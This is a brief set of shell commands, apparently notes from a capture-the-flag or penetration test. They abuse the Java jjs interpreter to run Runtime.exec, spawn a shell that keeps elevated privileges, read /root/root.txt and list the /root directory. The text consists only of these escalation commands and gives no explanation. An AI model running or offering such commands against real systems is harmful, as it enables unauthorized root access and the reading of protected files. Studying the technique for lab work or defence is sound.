echo &quot;Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p cat /root/root.txt').waitFor()&quot; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh id').waitFor()
Java.type('java.lang.Runtime').getRuntime().exec('ls -la /root/').waitFor()
